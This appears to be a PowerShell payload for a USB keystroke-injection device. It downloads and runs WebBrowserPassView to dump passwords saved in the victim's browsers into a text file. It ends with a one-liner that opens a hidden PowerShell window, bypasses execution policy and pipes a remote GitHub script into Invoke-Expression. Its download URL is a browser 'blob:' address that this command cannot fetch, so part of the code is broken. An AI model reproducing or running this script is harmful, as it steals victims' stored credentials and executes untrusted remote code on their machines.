$nameFile="WebBrowserPassView"
$runDirectory="$env:USERPROFILE\downloads"

$zipFolder="$runDirectory\$nameFile.zip"
$unzipFolder="$runDirectory\$nameFile"
$exeFile="$unzipFolder\$nameFile.exe"
$txtFile="$unzipFolder\$nameFile.txt"

$params="/sfile $txtFile"


Set-Location -path $runDirectory
Invoke-WebRequest -Uri "blob:https://github.com/a1d34f05-95ff-428d-aac1-fe466bd113b3" -Method Get -OutFile $zipFolder
Expand-Archive $zipFolder -DestinationPath $unzipFolder
& "$exeFile" $params
$txtFile

#STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
